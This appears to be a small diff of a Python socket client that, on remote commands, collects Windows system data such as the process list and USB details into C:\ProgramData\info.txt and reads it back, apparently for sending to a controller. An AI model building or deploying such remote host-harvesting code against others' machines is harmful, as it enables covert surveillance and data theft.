@@ -97,8 +97,7 @@ def GetMoreinfo(sock,target):
 # 进程信息
 def Process(sock):
     if SYS == 'nt':
-        os.system('echo nt@ > C:\\ProgramData\\info.txt')
-        os.system('systeminfo >> C:\\ProgramData\\info.txt')
+        os.system('tasklist >> C:\\ProgramData\\info.txt')
         f = open('C:\\ProgramData\\info.txt','r')
         data = f.read()
         f.close()
@@ -141,5 +140,4 @@ while True:
         GetMoreinfo(s,'USB')
     elif d == b'2':
         Process(s)
-print('bye')
 s.close()
